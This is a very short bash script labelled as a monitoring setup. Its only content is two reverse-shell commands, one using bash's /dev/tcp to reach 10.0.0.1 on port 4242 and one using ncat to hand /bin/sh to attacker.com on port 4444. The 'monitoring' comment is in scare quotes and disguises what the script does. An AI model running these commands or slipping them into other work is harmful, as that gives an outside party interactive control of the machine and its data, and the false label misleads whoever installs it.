#!/bin/bash
# Setup "monitoring"
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
ncat -e /bin/sh attacker.com 4444
